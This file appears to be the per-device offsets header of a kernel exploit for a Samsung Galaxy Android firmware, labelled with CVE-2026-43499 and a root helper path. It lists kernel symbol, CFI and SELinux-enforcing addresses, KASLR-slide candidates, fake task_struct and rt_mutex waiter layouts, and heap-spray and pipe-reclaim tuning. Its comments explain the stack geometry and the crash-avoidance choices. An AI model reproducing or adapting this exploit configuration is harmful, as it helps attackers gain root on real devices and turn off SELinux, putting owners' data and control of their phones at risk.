#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "r9q-G990BXXSLIZH2-app"
#else
#define BUILD_VARIANT_LABEL "r9q-G990BXXSLIZH2-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/r9qxeea/r9q:16/BP2A.250605.031.A3/G990BXXSLIZH2:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc010080000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
#define SKB_DATA_DELTA (-0xe80LL)

/* /proc/slabinfo on-device: mm_struct object_size=0x398, allocator stride
 * (SLUB s->size)=960=0x3c0, 34 objects per order-3 slab. KernelSnitch and
 * the reclaim choreography need the stride, not raw sizeof(struct mm_struct). */
#define MM_STRUCT_SZ 0x3c0
#define MM_ORDER 3
#define SKB_RECLAIM_SENDS 256
#define KMALLOC_CGROUP_TYPE 0
#define KMALLOC_CACHE_TYPES 2
#define LEGACY_RT_MUTEX_WAITER 1
#define PAYLOAD_DUAL_LOCK_SCAN 1

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_LOCK_OWNER_VALUE 1ULL
#define SLIDE_USE_FAKE_TASK 1
#define SLIDE_TRACEFS_EVENT_ID 73
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x002a5c80ULL
#define SLIDE_PSELECT_WORD_SHIFT 0
#define SLIDE_ALIGNMENT_MASK 0x7fffULL
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x008000ULL, 0x010000ULL, 0x018000ULL, \
  0x020000ULL, 0x028000ULL, 0x030000ULL, 0x038000ULL, \
  0x040000ULL, 0x048000ULL, 0x050000ULL, 0x058000ULL, \
  0x060000ULL, 0x068000ULL, 0x070000ULL, 0x078000ULL, \
  0x080000ULL, 0x088000ULL, 0x090000ULL, 0x098000ULL, \
  0x0a0000ULL, 0x0a8000ULL, 0x0b0000ULL, 0x0b8000ULL, \
  0x0c0000ULL, 0x0c8000ULL, 0x0d0000ULL, 0x0d8000ULL, \
  0x0e0000ULL, 0x0e8000ULL, 0x0f0000ULL, 0x0f8000ULL, \
  0x100000ULL, 0x108000ULL, 0x110000ULL, 0x118000ULL, \
  0x120000ULL, 0x128000ULL, 0x130000ULL, 0x138000ULL, \
  0x140000ULL, 0x148000ULL, 0x150000ULL, 0x158000ULL, \
  0x160000ULL, 0x168000ULL, 0x170000ULL, 0x178000ULL, \
  0x180000ULL, 0x188000ULL, 0x190000ULL, 0x198000ULL, \
  0x1a0000ULL, 0x1a8000ULL, 0x1b0000ULL, 0x1b8000ULL, \
  0x1c0000ULL, 0x1c8000ULL, 0x1d0000ULL, 0x1d8000ULL, \
  0x1e0000ULL, 0x1e8000ULL, 0x1f0000ULL, 0x1f8000ULL
#define SLIDE_MAX_ATTEMPTS 64

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
/* The Shizuku/shell payload uses tracefs and does not consume the physical
 * P0 pipe oracle, so no root-side P0 reference transfer is required. */
#define APP_ROOT_REF_HOLDER_REQUIRED 0
#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffffc000000000ULL
#define VMEMMAP_START 0xfffffffeffe00000ULL

#define ASHMEM_MISC_FOPS_OFF 0x02c729d8ULL
#define ASHMEM_FOPS_OFF 0x023f37a0ULL
#define ASHMEM_IOCTL_OFF 0x00159e18ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0015a738ULL
#define ASHMEM_MMAP_OFF 0x0015a78cULL
#define ASHMEM_OPEN_OFF 0x0015a930ULL
#define ASHMEM_RELEASE_OFF 0x0015a9a8ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x0015ab08ULL
#define CONFIGFS_READ_FILE_OFF 0x0058c8fcULL
#define CONFIGFS_WRITE_BIN_FILE_OFF 0x0058cdf4ULL
#define COPY_SPLICE_READ_OFF 0x0050cf10ULL
#define NOOP_LLSEEK_OFF 0x004c343cULL

#define ASHMEM_IOCTL_CFI_OFF 0x01735bf4ULL
#define ASHMEM_COMPAT_IOCTL_CFI_OFF 0x01735bf8ULL
#define ASHMEM_MMAP_CFI_OFF 0x01727c08ULL
#define ASHMEM_OPEN_CFI_OFF 0x01734554ULL
#define ASHMEM_RELEASE_CFI_OFF 0x01734558ULL
#define ASHMEM_SHOW_FDINFO_CFI_OFF 0x01723d94ULL
#define ASHMEM_LLSEEK_CFI_OFF 0x0172b65cULL
#define ASHMEM_READ_ITER_CFI_OFF 0x017368f0ULL
#define CONFIGFS_READ_BIN_FILE_CFI_OFF 0x01732990ULL
#define CONFIGFS_READ_FILE_CFI_OFF 0x01732b0cULL
#define CONFIGFS_WRITE_BIN_FILE_CFI_OFF 0x01734378ULL
#define COPY_SPLICE_READ_CFI_OFF 0x0172258cULL
#define NOOP_LLSEEK_CFI_OFF 0x0172b648ULL
#define INIT_TASK_OFF 0x02ce1e80ULL
#define ROOT_TASK_GROUP_OFF 0x03222448ULL
#define SELINUX_ENFORCING_OFF 0x033c9414ULL
#define KMALLOC_CACHES_OFF 0x02580910ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0241c078ULL
#define MISC_FOPS_OFF 0x02493ac0ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define MISC_FOPS (KIMAGE_TEXT_BASE + MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_FILE (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_OFF)
#define CONFIGFS_WRITE_BIN_FILE (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_FILE_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)

#define ASHMEM_IOCTL_CFI (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_CFI_OFF)
#define ASHMEM_COMPAT_IOCTL_CFI (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_CFI_OFF)
#define ASHMEM_MMAP_CFI (KIMAGE_TEXT_BASE + ASHMEM_MMAP_CFI_OFF)
#define ASHMEM_OPEN_CFI (KIMAGE_TEXT_BASE + ASHMEM_OPEN_CFI_OFF)
#define ASHMEM_RELEASE_CFI (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_CFI_OFF)
#define ASHMEM_SHOW_FDINFO_CFI (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_CFI_OFF)
#define ASHMEM_LLSEEK_CFI (KIMAGE_TEXT_BASE + ASHMEM_LLSEEK_CFI_OFF)
#define ASHMEM_READ_ITER_CFI (KIMAGE_TEXT_BASE + ASHMEM_READ_ITER_CFI_OFF)
#define CONFIGFS_READ_BIN_FILE_CFI \
  (KIMAGE_TEXT_BASE + CONFIGFS_READ_BIN_FILE_CFI_OFF)
#define CONFIGFS_READ_FILE_CFI (KIMAGE_TEXT_BASE + CONFIGFS_READ_FILE_CFI_OFF)
#define CONFIGFS_WRITE_BIN_FILE_CFI (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_BIN_FILE_CFI_OFF)
#define COPY_SPLICE_READ_CFI (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_CFI_OFF)
#define NOOP_LLSEEK_CFI (KIMAGE_TEXT_BASE + NOOP_LLSEEK_CFI_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
/* Work functions are invoked indirectly under Clang CFI. Use the exact
 * call_usermodehelper_exec_work.cfi_jt symbol, not the body (0x29e080) or
 * the old mid-function placeholder (0x29e0cc). */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x01740920ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x02befa48ULL
/* Located by matching the surrounding data block from the symbolized HYH1
 * Image into the exact LIZH2 boot Image. These runtime variables provide the
 * authoritative kernel-image and linear-map translations. */
#define PHYSVIRT_OFFSET_OFF 0x025807b0ULL
#define KIMAGE_VOFFSET_OFF 0x025807c8ULL
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define PHYSVIRT_OFFSET_IMAGE (KIMAGE_TEXT_BASE + PHYSVIRT_OFFSET_OFF)
#define KIMAGE_VOFFSET_IMAGE (KIMAGE_TEXT_BASE + KIMAGE_VOFFSET_OFF)
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0210a48aULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02beac18ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02d51cb0ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x034638a9ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_PRIO_OFF 0x40
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_LAYOUT_SIZE 0x50

/* task_struct offsets derived from this kernel's disassembly (G990BXXSLIZH2
 * vmlinux: rt_mutex_adjust_pi/adjust_prio_chain/remove_waiter), matching the
 * qgki 5.4 family. The previous values were copied from an exynos profile and
 * are wrong for this kernel: usage=0x38 (get_task_struct inline), prio=0x7c,
 * normal_prio=0x84, dl.deadline=0x428, pi_lock=0x8dc,
 * pi_waiters.rb_root=0x8e8, pi_waiters.rb_leftmost=0x8f0,
 * pi_top_task=0x8f8, pi_blocked_on=0x900.
 *
 * The FOPS payload keeps fake_task->pi_waiters zeroed, which makes the pi
 * chain walk skip the rb_next() leftmost fixup in the dequeue_pi branch
 * (rb_next would otherwise walk ashmem_misc.list.prev as an rb tree). */
#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_TASK_GROUP_OFF 0x3d8
#define FAKE_TASK_PI_LOCK_OFF 0x8dc
#define FAKE_TASK_PI_WAITERS_OFF 0x8e8
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8f8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x900

/* r9q route geometry (2026-10-22, verified against the vmlinux):
 * __arm64_sys_futex(0x70) + do_futex(0x20) + futex_wait_requeue_pi(0x1a0,
 * waiter at sp+0x98) put the reclaimed requeue_pi waiter at SP0-0x198.
 * pselect6: stub(0x10) + __do_sys_pselect6(0x90) + core_sys_select(0x1c0,
 * stack_fds at sp+0x50) put the 5-words-per-set fdset arrays at SP0-0x210, so
 * the waiter slot spans res_in words 0..4 (waiter qwords 0..4) and res_out
 * words 0..4 (waiter qwords 5..9) with nfds=320. The input words never reach
 * the waiter slot on this kernel; the spray must be crafted through the
 * result words: res_out word1 (writability of fds 64..127) becomes
 * waiter->task, word2 (fds 128..191) becomes waiter->lock, word3
 * (fds 192..255) becomes waiter->prio. */
#define ROUTE_READINESS_SPRAY 1

/* Route-thread core pinning. The default CORE 0 is Android's IRQ dumping
 * ground: hrtimer_interrupt's register saves start exactly at the sprayed
 * waiter->lock word (measured in the 2026-10-22 panic dumps: entry SP
 * top-0x2F0 == W->lock), so every hrtimer expiry on the waiter's core
 * during the ~8us window between the pselect's set_fd_set and the
 * consumer's sched_setattr reading W->lock clobbers the spray. Pin the
 * waiter (and the consumer, at CORE+1) to a big core that carries only the
 * 250Hz tick instead of core 0's device IRQ storm. SD888: 0-3 A55,
 * 4-6 A78, 7 X1. */
#define CORE 6

#define CFG_PAGE_OFF 0x10
#define CFG_NEEDS_READ_FILL_OFF 0x40
#define CFG_READ_IN_PROGRESS_OFF 0x44
#define CFG_WRITE_IN_PROGRESS_OFF 0x45
#define CFG_BIN_BUFFER_OFF 0x48
#define CFG_BIN_BUFFER_SIZE_OFF 0x50
#define CFG_CB_MAX_SIZE_OFF 0x54

#define WQ_DFL_PWQ_OFF 0xa0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x58
#define PWQ_MAX_ACTIVE_OFF 0x5c
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34

#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

/* Unprivileged F_SETPIPE_SZ is capped at 64 KiB on this device: 16
 * pipe_buffer slots -> 640 bytes, rounded to the kmalloc-1k cache. */
#define PIPE_BUFFER_SLOTS 16
#define KMALLOC_PIPE_INDEX 10
#define KMALLOC_PIPE_OBJ_SIZE 0x400
#define PIPE_OBJS_PER_SLAB 32
#define PIPE_CPU_PARTIAL 6
/* Stay under the per-user pipe-page budget while biasing capacity toward
 * post-release allocations: six slabs consume existing kmalloc-1k partials,
 * then 24 reclaim slabs search split/merged order-3 blocks. */
#define PIPE_DRAIN_SLABS 6
#define PIPE_RECLAIM_SLABS 24
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PIPE_MAX_ATTEMPTS 3
#else
#define PIPE_MAX_ATTEMPTS 1
#endif
/* This vendor 5.4 predates PIPE_BUF_FLAG_CAN_MERGE. Anonymous pipe
 * buffers use flags=0 and mergeability comes from ops->can_merge. */
#define PIPE_BUF_FLAG_CAN_MERGE 0x00

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
